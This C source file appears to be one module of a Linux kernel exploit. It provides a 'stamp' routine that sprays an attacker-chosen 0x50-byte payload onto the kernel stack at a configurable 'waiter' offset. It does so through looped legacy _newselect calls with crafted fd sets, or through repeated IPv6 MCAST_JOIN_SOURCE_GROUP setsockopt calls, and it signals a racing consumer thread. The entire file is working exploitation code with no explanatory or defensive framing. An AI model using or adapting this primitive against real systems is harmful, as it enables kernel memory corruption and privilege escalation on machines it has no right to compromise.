#define _GNU_SOURCE

#include <errno.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>
#include <netinet/in.h>

#include "offset.h"
#include "kernelsnitch/utils.h"

extern atomic_int g_consumer_go;

#define STAMP_PAYLOAD_BYTES 0x50

#ifndef __NR__newselect
#define __NR__newselect 142
#endif
#ifndef STAMP_NFDS
#define STAMP_NFDS 320
#endif
#ifndef STAMP_WAITER_OFF
#define STAMP_WAITER_OFF 0x30
#endif
#ifndef STAMP_SETSOCKOPT_OFF
#define STAMP_SETSOCKOPT_OFF 0x34
#endif
#ifndef STAMP_VIA_SELECT
#define STAMP_VIA_SELECT 1
#endif
#ifndef STAMP_SOCKTYPE
#define STAMP_SOCKTYPE 0       /* 0=SOCK_DGRAM 1=SOCK_STREAM 2=SOCK_RAW */
#endif
#ifndef STAMP_HOLD
#define STAMP_HOLD 1
#endif

#define STAMP_MAX_NFDS 4096
#define STAMP_MAX_SET_BYTES (STAMP_MAX_NFDS / 8)

static const int g_stamp_nfds = STAMP_NFDS;
static const int g_stamp_waiter_off = STAMP_WAITER_OFF;
static const int g_stamp_method = STAMP_VIA_SELECT; /* 1 select, 0 setsockopt */
static const int g_stamp_socktype = STAMP_SOCKTYPE;

struct old_timeval32 {
    int32_t tv_sec;
    int32_t tv_usec;
};

static void widen_fdtable(int nfds) {
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 &&
        rl.rlim_cur < (rlim_t)(nfds + 128)) {
        rl.rlim_cur = (rl.rlim_max < (rlim_t)(nfds + 128))
                          ? rl.rlim_max
                          : (rlim_t)(nfds + 128);
        setrlimit(RLIMIT_NOFILE, &rl);
    }

    int pfd[2];
    if (pipe(pfd) != 0) {
        pr_warning("Stamp: pipe failed errno=%d\n", errno);
        return;
    }
    int wr = nfds + 64;
    if (dup2(pfd[1], wr) < 0)
        pr_warning("Stamp: dup2 write-end failed errno=%d\n", errno);
    if (pfd[1] != wr)
        close(pfd[1]);
    for (int fd = 3; fd < nfds; fd++) {
        if (fd == pfd[0] || fd == wr)
            continue;
        dup2(pfd[0], fd);
    }
}

static void stamp_select(uint64_t *buf) {
    int nfds = g_stamp_nfds;
    if (nfds < 64) nfds = 64;
    if (nfds > STAMP_MAX_NFDS) nfds = STAMP_MAX_NFDS;
    int set_bytes = nfds / 8;
    int total = 3 * set_bytes;
    int woff = g_stamp_waiter_off;
    if (woff < 0) woff = 0;
    if (woff > total) woff = total;

    const uint8_t *payload = (const uint8_t *)buf;

    uint8_t flat[3 * STAMP_MAX_SET_BYTES];
    memset(flat, 0, (size_t)total);
    {
        size_t avail = (size_t)(total - woff);
        size_t n = STAMP_PAYLOAD_BYTES < avail ? STAMP_PAYLOAD_BYTES : avail;
        memcpy(flat + woff, payload, n);
    }

    widen_fdtable(nfds);
    pr_info("Stamp: select n=%d, waiter at +0x%x\n", nfds, woff);

    for (;;) {
        struct old_timeval32 tv = { 0, 50000 };
        uint8_t work[3 * STAMP_MAX_SET_BYTES];
        memcpy(work, flat, (size_t)total);
        atomic_store(&g_consumer_go, 1);
        syscall(__NR__newselect, nfds, work, work + set_bytes,
                work + 2 * set_bytes, &tv);
    }
}

#define STAMP_GSR_LEN 264
static void stamp_setsockopt(uint64_t *buf) {
    int off = g_stamp_waiter_off;
    int maxoff = STAMP_GSR_LEN - (int)STAMP_PAYLOAD_BYTES;
    if (off < 0) off = 0;
    if (off > maxoff) off = maxoff;

    int st = (g_stamp_socktype == 1) ? SOCK_STREAM
           : (g_stamp_socktype == 2) ? SOCK_RAW : SOCK_DGRAM;
    int proto = (g_stamp_socktype == 2) ? IPPROTO_RAW : 0;
    int fd = socket(AF_INET6, st, proto);
    if (fd < 0) {
        pr_warning("Do_stamp_stack: socket failed errno=%d\n", errno);
        return;
    }
    uint8_t buffer[STAMP_GSR_LEN];
    memset(buffer, 0, sizeof(buffer));
    memcpy(buffer + off, buf, STAMP_PAYLOAD_BYTES);

    if (STAMP_HOLD) {
        setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, buffer,
                   STAMP_GSR_LEN);
        atomic_store(&g_consumer_go, 1);
        for (volatile uint64_t i = 0;; i++) {
            if ((i & 0xffffff) == 0xffffff)
                setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, buffer,
                           STAMP_GSR_LEN);
        }
    }

    uint64_t times = 10000000;
    while (times--) {
        atomic_store(&g_consumer_go, 1);
        setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, buffer,
                   STAMP_GSR_LEN);
    }
    close(fd);
}

void do_stamp_stack(uint64_t *buf) {
    if (g_stamp_method)
        stamp_select(buf);
    else
        stamp_setsockopt(buf);
}
